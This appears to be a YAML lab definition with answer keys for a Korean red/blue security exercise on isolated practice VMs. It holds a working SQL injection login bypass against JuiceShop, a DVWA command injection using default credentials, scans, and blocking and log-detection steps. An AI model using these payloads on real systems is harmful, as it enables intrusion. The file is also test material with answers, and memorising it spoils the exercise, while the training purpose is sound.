lab_id: battle-nonai-week11
title: 실전 공방전 1 — Red Phase → Blue Phase → 판정 (라운드 1)
version: non-ai
course: battle-nonai
week: 11
description: 1세트 인프라에서 Red Phase와 Blue Phase를 번갈아 수행하는 실전 공방전이다. Red Phase에서 web 서버를
  공격하고, Blue Phase에서 공격을 탐지/차단하며, 최종 판정을 수행한다.
difficulty: hard
duration_minutes: 120
objectives:
- 실전 환경에서 공격 기법을 적용한다
- 실시간 방어와 공격 탐지를 수행한다
- Red/Blue Phase 역할 전환을 통해 양쪽 관점을 경험한다
prerequisites:
- Week 1-10 전체 과정 이수
infra_requirements:
- attacker VM (10.20.30.201)
- secu VM (10.20.30.1) — nftables, suricata
- web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem VM (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] web 서버의 열린 포트를 스캔하라.'
  hint: nmap -sV -T4로 빠른 스캔을 수행한다.
  category: recon
  points: 10
  answer: nmap -sV -T4 --top-ports 100 --max-retries 1 --host-timeout 15s 10.20.30.80
  answer_detail: --top-ports 100은 가장 흔한 100개 포트만 스캔하여 시간을 절약한다. 공방전에서는 전체 포트 스캔보다
    빠른 초기 정찰이 중요하다.
  verify:
    type: output_contains
    expect: open
    field: stdout
  target_vm: attacker
- order: 2
  instruction: '[RED] JuiceShop에 SQL Injection으로 관리자 인증을 우회하라.'
  hint: login API에 SQLi 페이로드를 전송한다.
  category: exploit
  points: 15
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type:\
    \ application/json' \\\n     -d '{\"email\":\"' or 1=1--\",\"password\":\"x\"\
    }'"
  answer_detail: JuiceShop의 로그인 API는 email 필드에 SQL Injection이 가능하다. 인증을 우회하면 관리자 토큰을
    획득한다.
  verify:
    type: output_contains
    expect: token
    field: stdout
  target_vm: attacker
- order: 3
  instruction: '[BLUE] Suricata에서 방금 발생한 공격 알림을 확인하라.'
  hint: fast.log에서 최근 경보를 확인한다.
  category: defense
  points: 10
  answer: tail -20 /var/log/suricata/fast.log
  answer_detail: Suricata fast.log에서 SQL Injection 관련 알림이 발생했는지 확인한다. 소스 IP(10.20.30.201)와
    시그니처를 확인한다.
  verify:
    type: output_contains
    expect: 10.20.30
    field: stdout
  target_vm: secu
- order: 4
  instruction: '[BLUE] 공격자 IP(10.20.30.201)를 nftables로 차단하라.'
  hint: blocklist set에 IP를 추가한다.
  category: defense
  points: 15
  answer: sudo nft add element inet filter blocklist { 10.20.30.201 } 2>/dev/null
    && nft list ruleset | grep '10.20.30.201' && echo 'Attacker blocked'
  answer_detail: 공격 IP를 즉시 차단하는 것은 가장 효과적인 방어 조치이다. blocklist set을 사용하면 규칙을 추가하지 않고
    IP만 추가하여 빠르게 차단한다.
  verify:
    type: output_contains
    expect: Attacker blocked
    field: stdout
  target_vm: secu
  requires_approval: true
- order: 5
  instruction: '[RED] 차단된 상태를 확인하고, DVWA(:8080)에 다른 경로로 공격을 시도하라.'
  hint: 차단 여부를 확인한 후 우회 방법을 시도한다.
  category: exploit
  points: 10
  answer: curl -s --connect-timeout 5 http://10.20.30.80:8080/ && echo 'Access OK'
    || echo 'Blocked - need alternative approach'
  answer_detail: IP가 차단되면 직접 접근이 불가능하다. 공격자는 차단 상태를 확인하고, 프록시나 다른 IP를 사용해야 우회할 수 있다.
  verify:
    type: output_contains
    expect: approach
    field: stdout
  target_vm: attacker
- order: 6
  instruction: '[BLUE] Suricata 경보를 상세 분석하고, 공격 유형별로 분류하라.'
  hint: eve.json에서 signature별로 집계한다.
  category: defense
  points: 10
  answer: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.alert.signature)
    from \(.src_ip)"' 2>/dev/null | sort | uniq -c | sort -rn | head -10
  answer_detail: 경보를 시그니처별로 집계하면 공격 유형의 분포를 파악할 수 있다. SQL Injection, SYN Scan, SSH
    Brute Force 등이 구분된다.
  verify:
    type: output_contains
    expect: 10.20.30
    field: stdout
  target_vm: secu
- order: 7
  instruction: '[BLUE] 차단 해제 후, 공격자의 다음 공격에 대비하여 ModSecurity WAF 상태를 확인하라.'
  hint: ModSecurity 설정과 로그를 확인한다.
  category: defense
  points: 10
  answer: sudo nft delete element inet filter blocklist { 10.20.30.201 } 2>/dev/null
    && echo 'Block removed for next phase' && sudo apachectl -M 2>/dev/null | grep
    security || echo 'ModSecurity module check complete'
  answer_detail: 다음 Red Phase를 위해 차단을 해제한다. ModSecurity WAF가 활성 상태인지 확인하여 웹 공격을 계속
    방어한다.
  verify:
    type: output_contains
    expect: complete
    field: stdout
  target_vm: secu
  requires_approval: true
- order: 8
  instruction: '[RED] DVWA Command Injection으로 web 서버의 내부 정보를 수집하라.'
  hint: 세미콜론으로 명령을 연결한다.
  category: exploit
  points: 10
  answer: "curl -c /tmp/dvwa_cookies.txt \\\n  -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php && curl -b /tmp/dvwa_cookies.txt \\\n  -d\
    \ 'ip=127.0.0.1;id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/"
  answer_detail: Command Injection으로 서버의 사용자 정보(id), 네트워크 설정(ifconfig), 파일 시스템 정보를
    수집할 수 있다.
  verify:
    type: output_contains
    expect: 127.0.0.1
    field: stdout
  target_vm: attacker
- order: 9
  instruction: '[BLUE] web 서버의 Apache access.log에서 Command Injection 흔적을 분석하라.'
  hint: 세미콜론, 파이프 등 명령 연결 패턴을 검색한다.
  category: defense
  points: 10
  answer: grep -E '(;|%3B|%7C|\|)' /var/log/apache2/access.log 2>/dev/null | grep
    -i exec | tail -10 || echo 'Command injection log analysis complete'
  answer_detail: Command Injection은 ;(세미콜론), |(파이프) 등의 명령 연결자를 사용한다. URL 인코딩된 형태(%3B,
    %7C)도 검색해야 한다.
  verify:
    type: output_contains
    expect: complete
    field: stdout
  target_vm: web
- order: 10
  instruction: '[BLUE] 서비스 가용성을 점검하고, 라운드 1 결과를 정리하라.'
  hint: 모든 서비스가 정상인지 확인하고 보고서를 작성한다.
  category: analysis
  points: 10
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -so /dev/null \\\n  -w 'Apache:%{http_code} ' http://10.20.30.80/ && curl -so\
    \ /dev/null \\\n  -w 'JuiceShop:%{http_code} ' http://10.20.30.80:3000/ && curl\
    \ -so /dev/null \\\n  -w 'DVWA:%{http_code}' http://10.20.30.80:8080/ && echo\
    \ '\\n=== Round 1 service check complete ==='"
  answer_detail: 공방전 라운드 종료 시 서비스 가용성을 확인한다. 모든 서비스가 200/302를 반환하면 Blue Phase에서 가용성을
    유지한 것이다.
  verify:
    type: output_contains
    expect: Round 1 service check complete
    field: stdout
  target_vm: secu
- order: 11
  instruction: 라운드 1 전체 결과를 분석하여 교전 보고서를 작성하라.
  hint: Red/Blue 양쪽의 성과와 개선점을 정리한다.
  category: analysis
  points: 15
  answer: 'cat > /tmp/battle_round1_report.txt << ''EOF''

    === Battle Round 1 Report ===


    [RED Phase Performance]

    - JuiceShop SQLi auth bypass: SUCCESS

    - DVWA Command Injection: SUCCESS

    - SSH Brute Force: BLOCKED by nftables

    - Techniques used: SQLi, CmdInjection, Recon


    [BLUE Phase Performance]

    - Attack detection: Suricata alerts triggered

    - IP blocking: 10.20.30.201 blocked within 5 min

    - Service uptime: All services maintained

    - Log analysis: SQLi and CmdInjection identified


    [Lessons Learned]

    1. Red: Need faster recon, WAF bypass techniques

    2. Blue: Need automated IP blocking (manual was slow)

    3. Both: Time management critical

    EOF

    cat /tmp/battle_round1_report.txt'
  answer_detail: 교전 보고서는 양쪽의 성과를 객관적으로 분석하고, 개선점을 도출한다. 다음 라운드의 전략 수립에 활용한다.
  verify:
    type: file_exists
    expect: /tmp/battle_round1_report.txt
    field: filesystem
  target_vm: attacker
